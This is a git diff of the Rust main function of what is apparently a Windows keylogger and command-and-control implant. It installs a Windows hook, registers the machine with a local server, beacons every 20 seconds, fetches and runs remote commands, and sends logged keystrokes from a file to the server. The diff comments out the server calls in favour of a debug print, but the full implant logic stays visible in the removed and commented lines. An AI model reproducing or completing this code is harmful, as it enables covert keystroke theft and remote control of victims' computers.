@@ -21,67 +21,44 @@ macro_rules! unwrap_or_panic {
 #[tokio::main]
 async fn main() {
     const URL: &'static str  = "http://127.0.0.1:5000";
-
-    // let mut enc = encode::Encode::new(52);
     
-    // let test = "HIII";
-    
-    // // let enc_string = enc.encrypt(&test);
-
-    // // let enc_string =  &enc_string;
-
-    // let array: [& str; 4] = ["Ug==","bw==", "bg==", "7Q=="];
-
-    // for a in array{
-    //     let dec_string = enc.decrypt(a);
-    //     println!("Dec: {}", dec_string);
-
-    // }
-        
-    // println!("Org: {}", &test);
-    // println!("Enc: {:#?}", &enc_string);
-    
-    
-    let server = Arc::new(server::Connection::new(&URL));
+    // let server = Arc::new(server::Connection::new(&URL));
 
     let arch = get_windows_version();
 
-    let id: String = unwrap_or_panic!(server.register(arch).await);
+    print!("{}", arch);
 
-    let server_clone = Arc::clone(&server);
-    let id_clone = id.clone();
+    // let id: String = unwrap_or_panic!(server.register(arch).await);
+
+    // let server_clone = Arc::clone(&server);
+    // let id_clone = id.clone();
 
     tokio::spawn(async move {
 
         unsafe {
             set_windows_hook();
         }
-
-        loop{
-            
-        }
     });
 
-    tokio::spawn(async move {
+    // tokio::spawn(async move {
 
-        loop {
-            server_clone.becon(&id_clone).await;
-            sleep(Duration::from_secs(20)).await; 
-        }
-    });
+    //     loop {
+    //         server_clone.becon(&id_clone).await;
+    //         sleep(Duration::from_secs(20)).await; 
+    //     }
+    // });
 
     loop{
         // Execute Commands
-        let rec = unwrap_or_panic!(server.get_command(&id).await);
-        execute_command(&rec).await; 
+        // let rec = unwrap_or_panic!(server.get_command(&id).await);
+        // execute_command(&rec).await; 
 
         //read file and
-        let keys = read_file();
-        let result = server.send_data(&id, &keys.clone()).await;
+        // let keys = read_file();
+        //let result = server.send_data(&id, &keys.clone()).await;
         
-        sleep(Duration::from_secs(10)).await;
+        // sleep(Duration::from_secs(10)).await;
         
-
     }
     
     
@@ -90,7 +67,6 @@ async fn main() {
 
 async fn execute_command(cmd: & str){
    
-    println!("Executing");
     let cmds: Vec<_> = cmd.split([':']).collect();
     println!("{}",cmds[0] == "slp");
 
